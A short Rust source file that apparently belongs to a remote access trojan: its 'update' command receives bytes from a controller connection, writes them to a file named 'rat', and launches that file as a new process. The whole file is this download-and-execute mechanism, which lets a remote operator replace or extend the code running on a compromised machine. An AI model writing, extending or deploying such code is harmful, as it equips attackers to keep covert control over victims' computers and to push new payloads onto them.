use tokio::{fs, process::Command};

use crate::connector::Connector;

use super::Result;

#[derive(Clone, Debug)]
pub struct Update {
    name: String,
}
impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
    pub fn get_command(&self) -> String {
        "update".to_string()
    }
    pub async fn run(&self, connector: &mut Connector) -> Result {
        let path_to_program = String::from("rat");
        match fs::write(path_to_program.clone(), connector.accept_message().await).await {
            Ok(_) => {
                //launch it
                if let Ok(result) = Command::new(path_to_program).spawn() {
                    println!("Started process with PID: {}", result.id().unwrap());
                    Result::SUCCESFUL
                } else {
                    Result::FAILED
                }
            }
            Err(_) => Result::FAILED,
        }
    }
}
